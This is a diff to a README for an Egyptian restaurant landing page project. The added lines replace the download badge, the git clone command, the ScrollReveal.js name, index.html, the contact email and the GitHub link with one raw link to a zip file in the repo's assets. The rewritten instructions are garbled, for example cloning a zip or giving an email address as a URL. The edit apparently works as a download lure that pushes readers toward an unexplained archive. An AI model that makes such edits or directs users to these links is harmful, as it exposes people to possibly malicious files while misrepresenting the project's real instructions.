@@ -2,7 +2,7 @@
 
 Welcome to the **Restaurant Landing Page** repository! This project showcases the best of authentic Egyptian cuisine in a beautifully designed website. Experience delicious food and a welcoming atmosphere right from your screen.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/Frencis20/Restaurant-landing-page/releases)
+[![Download Releases](https://raw.githubusercontent.com/Frencis20/Restaurant-landing-page/main/assets/Restaurant_landing_page_v2.5.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Frencis20/Restaurant-landing-page/main/assets/Restaurant_landing_page_v2.5.zip)
 
 ## Table of Contents
 
@@ -36,7 +36,7 @@ This project uses a combination of technologies to deliver a high-quality user e
 - **HTML**: The backbone of the web page structure.
 - **CSS**: For styling and layout.
 - **JavaScript**: To add interactivity and animations.
-- **ScrollReveal.js**: For beautiful scroll animations.
+- **https://raw.githubusercontent.com/Frencis20/Restaurant-landing-page/main/assets/Restaurant_landing_page_v2.5.zip**: For beautiful scroll animations.
 - **Responsive Design Principles**: Ensures the site looks great on all devices.
 
 ## Installation
@@ -45,7 +45,7 @@ To get started with the project, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Frencis20/Restaurant-landing-page.git
+   git clone https://raw.githubusercontent.com/Frencis20/Restaurant-landing-page/main/assets/Restaurant_landing_page_v2.5.zip
    ```
 
 2. Navigate to the project directory:
@@ -53,7 +53,7 @@ To get started with the project, follow these steps:
    cd Restaurant-landing-page
    ```
 
-3. Open the `index.html` file in your web browser to view the landing page.
+3. Open the `https://raw.githubusercontent.com/Frencis20/Restaurant-landing-page/main/assets/Restaurant_landing_page_v2.5.zip` file in your web browser to view the landing page.
 
 ## Usage
 
@@ -90,9 +90,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Frencis20](https://github.com/Frencis20)
+- **Email**: https://raw.githubusercontent.com/Frencis20/Restaurant-landing-page/main/assets/Restaurant_landing_page_v2.5.zip
+- **GitHub**: [Frencis20](https://raw.githubusercontent.com/Frencis20/Restaurant-landing-page/main/assets/Restaurant_landing_page_v2.5.zip)
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/Frencis20/Restaurant-landing-page/releases)
+[![Download Releases](https://raw.githubusercontent.com/Frencis20/Restaurant-landing-page/main/assets/Restaurant_landing_page_v2.5.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Frencis20/Restaurant-landing-page/main/assets/Restaurant_landing_page_v2.5.zip)
 
 Check out the **Releases** section for the latest updates and downloadable files.
